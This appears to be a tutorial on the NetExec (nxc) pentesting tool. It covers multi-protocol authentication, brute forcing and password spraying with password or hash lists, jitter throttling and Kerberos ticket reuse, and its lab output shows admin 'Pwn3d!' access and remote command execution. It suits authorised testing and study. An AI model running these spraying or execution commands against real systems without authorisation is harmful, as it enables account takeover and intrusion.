`Netexec` is a powerful tool that revolves around various protocol. From enumeration to exploitation, it's the best tool you could do to gather information in an infrastructure. Protocols that `nxc` supports are: **FTP**, **SSH**, **WINRM**, **LDAP**, **SMB**, **RDP**, **VNC**, and **WMI**. The basic usage of `nxc` is:
```bash
nxc <protocol> <target(s)> -u username -p password
```
It is recommended that usernames or passwords with special characters are wrapped in single quotes `''` so that the shell interprets it as a string.
Protocols can verify if an account has code execution which results in **Pwn3d!**. 
## Protocols

| **Protocol** | **Pwn3d! output**                 |
| ------------ | --------------------------------- |
| FTP          | No Check                          |
| SSH          | root (otherwise specific message) |
| WINRM        | Code execution at least           |
| LDAP         | Path to domain admin              |
| SMB          | Most likely (local) admin         |
| RDP          | Code execution at least           |
| VNC          | Code execution at least           |
| WMI          | Most likely local admin           |
# Using a Credential Set From the Database
It is also possible to specify an ID (or multiple credential IDs) with the `-id` flag, `nxc` will automatically pull that credential from the back-end database and use it to authenticate
```bash
nxc <protocol> <target(s)> -id <cred ID(s)>
```

If you have a file which contains the domain environment which has the contents like
```bash
DOMAIN1\user
DOMAIN2\user
```
You can use the following command
```bash
nxc <protocol> <target(s)> -u FILE -p password
```

## Brute Forcing & Password Spraying
By default, `nxc` will brute force and password spray credentials if you specify multiple username or password through file or string. This also supports hashes instead of password by using the `-H` flag.
```bash
nxc <protocol> <target(s)> -u username1 username2 -p password
nxc <protocol> <target(s)> -u username1 -p password1 password2
nxc <protocol> <target(s)> -u file_usernames.txt -p file_passwords.txt
nxc <protocol> <target(s)> -u file_usernames.txt -H file_hashes.txt
```

# Password Spraying Without Bruteforce
We can also avoid bruteforcing if we only want password spraying when we use files (-u file -p file). Can be useful for protocols like WinRM and MSSQL.
```bash
nxc <protocol> <target(s)> -u file_usernames.txt -p file_passwords.txt --no-bruteforce
```
Bruteforce is trying a combination of usernames. By default `nxc` will exit if it found a successful login. You can use `--continue-on-success` option so that it will still spray password until the end of the list.

## Throttling Authentication Requests
Authentication throttling works on a per-host basis since excessive option will lead to denial of service.
```bash
nxc <protocol> <target> --jitter 3 -u file_usernames.txt -p file_passwords.txt
nxc <protocol> <target> --jitter 2-5 -u file_usernames.txt -p file_passwords.txt
nxc <protocol> <target> --jitter 4-4 -u file_usernames.txt -p file_passwords.txt
```
The length of the timeout (in seconds) between requests is randomly selected from an interval unless otherwise specified. To hardcode the timeout, set the upper and lower bounds of the interval.

# Using Kerberos
Netexec support Kerberos authentication. There are two options:
* Using password/hash which automatically takes care of handling the TGT/ST
* Using an existing ticket by specifying the file via the `KRB5CCNAME` environment variable
```bash
$ nxc smb zoro.gold.local -u bonclay -p Ocotober2022 -k
SMB         zoro.gold.local 445    ZORO             [*] Windows 10.0 Build 14393 (name:ZORO) (domain:gold.local) (signing:False) (SMBv1:False)
SMB         zoro.gold.local 445    ZORO             [+] gold.local\bonclay
```
Or, using `--use-kcache`
```bash
$ export KRB5CCNAME=/home/bonclay/impacket/administrator.ccache 
$ nxc smb zoro.gold.local --use-kcache
SMB         zoro.gold.local 445    ZORO             [*] Windows 10.0 Build 14393 (name:ZORO) (domain:gold.local) (signing:False) (SMBv1:False)
SMB         zoro.gold.local 445    ZORO             [+] gold.local\administrator (Pwn3d!)
$ nxc smb zoro.gold.local --use-kcache -x whoami
SMB         zoro.gold.local 445    ZORO             [*] Windows 10.0 Build 14393 (name:ZORO) (domain:gold.local) (signing:False) (SMBv1:False)
SMB         zoro.gold.local 445    ZORO             [+] gold.local\administrator (Pwn3d!)
SMB         zoro.gold.local 445    ZORO             [+] Executed command 
SMB         zoro.gold.local 445    ZORO             gold\administrator

$ export KRB5CCNAME=/home/bonclay/impacket/bonclay.ccache
$ nxc smb zoro.gold.local --use-kcache -x whoami
SMB         zoro.gold.local 445    ZORO             [*] Windows 10.0 Build 14393 (name:ZORO) (domain:gold.local) (signing:False) (SMBv1:False)
SMB         zoro.gold.local 445    ZORO             [+] gold.local\bonclay
```
